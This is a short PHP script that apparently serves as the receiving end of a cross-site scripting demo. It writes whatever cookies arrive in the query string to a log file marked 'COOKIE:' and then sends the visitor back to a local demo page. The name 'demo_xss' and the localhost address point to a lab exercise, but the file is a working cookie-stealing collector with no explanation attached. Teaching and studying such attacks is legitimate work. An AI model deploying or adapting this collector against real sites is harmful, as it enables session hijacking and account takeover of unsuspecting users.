<?php
$cookie = $_SERVER['QUERY_STRING'];
$file = fopen("log.txt","a+");
fwrite($file, "COOKIE: $cookie .\n");
fclose($file);
header("Location: http://localhost/demo_xss/index.php");
